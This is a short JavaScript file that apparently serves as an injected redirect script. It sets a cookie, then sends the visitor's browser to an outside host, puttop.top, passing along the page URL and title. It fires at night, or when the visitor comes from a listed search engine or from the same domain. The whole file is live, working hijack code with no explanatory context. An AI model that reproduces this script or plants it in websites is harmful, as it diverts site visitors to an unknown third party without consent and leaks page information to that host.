
 
function setUCookie(u_name,value){
	var exdate=new Date()
	exdate.setHours(exdate.getHours() + 4);
	document.cookie=u_name+ "=" +escape(value)+"; expires="+exdate.toGMTString();
}
 
function getUCookie(u_name){
	if (document.cookie.length>0){ 
		u_start=document.cookie.indexOf(u_name + "=")
		if (u_start!=-1){ 
			u_start=u_start + u_name.length+1 
			u_end=document.cookie.indexOf(";",u_start)
			if (u_end==-1){ 
				u_end=document.cookie.length;
			}
			return unescape(document.cookie.substring(u_start,u_end))
		} 
	}
	return ""
}
 
function _setTimeout(){
	if(getUCookie("uTimeCookie")!=1){
		 var now = new Date();
		 var hours = now.getHours();
		 if(hours>=18 || hours<=7) {
			if(window.self==window.top){
				window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
			}
		 }else{
			var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|godado|msn|excite|libero|iltrovatore|tiscali)(\.[a-z0-9\-]+){1,2}\//ig;
			var where =document.referrer;
			if(regexp.test(where))
			 {
				if(window.self==window.top){
					window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
				}
			}
			 
			var domain = document.domain;
			if(typeof where != "undefined" && where != null && where != "" && typeof domain != "undefined" || domain != null || domain != "")
			{
				if(where.indexOf(domain) != -1){
					if(window.self==window.top){
						window.location.href='http://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
					}
				}
			}
		 }
	}
}
_setTimeout(); 
setUCookie("uTimeCookie","1");
 

 
 
